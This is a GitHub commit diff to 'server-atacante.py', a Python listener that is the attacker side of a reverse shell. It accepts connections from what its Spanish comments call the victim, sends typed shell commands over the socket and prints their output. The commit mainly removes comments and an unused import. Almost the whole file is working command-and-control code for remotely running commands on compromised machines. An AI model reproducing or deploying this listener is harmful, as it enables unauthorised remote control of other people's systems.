3a975b706760cb426b2cfd81c049042951d8d5e5
MOTS07 <86205809+MOTS07@users.noreply.github.com>
2021-06-26 21:02:27 -0500

    Update server-atacante.py

--- server-atacante.py
+++ server-atacante.py
@@ -2,24 +2,21 @@ from os import kill
 import threading
 import socket
 import sys
-import requests, signal
+import signal
 
-# ! Terminar script CTRL + C
 def sig_handler(sig, frame):
     print('[*] Exiting.....\n')
     sys.exit(0)
 signal.signal(signal.SIGINT, sig_handler)
 
-# ! Fin del comando
+
 FIN_COMANDO = b'#00#'
 
 def desplegar_salida_comando(salida):
-    # ! Vienen en binario, espera la respuesta del servidor y despliega la salida
     salida = salida.decode('UTF-8') # ! str
     print(salida)
 
 def leer_respuesta(socket):
-    # ! Lee el canal de comunicacion del servidor y reconstruye el comando
     salida = socket.recv(2048)
     while not salida.endswith(FIN_COMANDO):
         salida += salida.recv(2048)
@@ -27,8 +24,7 @@ def leer_respuesta(socket):
     return salida[:-quitar_caracteres]
 
 def mandar_comando(comando, socket):
-    # ! Esperamos la respuesta del cliente(victima) y la retornamos
-    comando = comando.encode('UTF-8') # * Convertimos a binario
+    comando = comando.encode('UTF-8')
     comando += FIN_COMANDO
     socket.send(comando)
     #print(comando)
@@ -36,20 +32,18 @@ def mandar_comando(comando, socket):
     return salida
 
 def leer_comandos(socket):
-    #print(socket)
     comando = ''
     print('Welcome to Shell!')
     print('Start to write commands!')
     while comando != b'exit':
-        comando = input('$> ') # ! Lee un str NO un binario
+        comando = input('$> ')
         respuesta = mandar_comando(comando, socket)
         desplegar_salida_comando(respuesta)
 
 def inicializar_servidor(puerto):
-    # * Creamos el socket
     servidor = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     servidor.bind(('', int(puerto)))
-    servidor.listen(5) # * Peticiones simultaneas
+    servidor.listen(5)
     while True:
         cliente, addr = servidor.accept()
         print('Connection received from {}'.format(addr))
@@ -57,5 +51,5 @@ def inicializar_servidor(puerto):
         hilo_comandos.start()
 
 if __name__ == '__main__':
-    puerto = sys.argv[1] # * Pasamos el puerto
+    puerto = sys.argv[1] # * Pasamos el puerto que asignamos en cliente
     socket = inicializar_servidor(puerto) 
